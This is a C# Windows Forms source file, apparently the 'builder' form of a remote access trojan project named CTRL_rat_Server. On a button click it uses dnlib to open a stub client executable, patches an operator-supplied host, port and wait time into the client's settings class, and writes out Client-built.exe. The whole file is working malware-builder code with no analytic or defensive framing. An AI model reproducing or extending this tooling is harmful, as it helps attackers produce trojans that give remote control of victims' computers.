using dnlib.DotNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CTRL_rat_Server.forms
{
    public partial class builder : Form
    {
        public builder()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string host = textBox1.Text;
            string port = textBox2.Text;
            string wait = textBox3.Text;
            string outpath = Environment.CurrentDirectory + "\\Client-built.exe";
            string stub = Environment.CurrentDirectory + "\\stub" + "\\stub.exe";
            string FullName = "CTRL_rat_Client.info";
            var Assembly = AssemblyDef.Load(stub);
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        Constructor.Body.Instructions[0].Operand = host;
                        Constructor.Body.Instructions[2].Operand = port;
                        Constructor.Body.Instructions[4].Operand = wait;
                        try
                        {
                            Assembly.Write(outpath);
                            MessageBox.Show("built to: " + outpath);
                        }
                        catch (Exception b)
                        {
                            MessageBox.Show("ERROR: " + b);
                        }
                    }
                }
            }
        }
    }
}
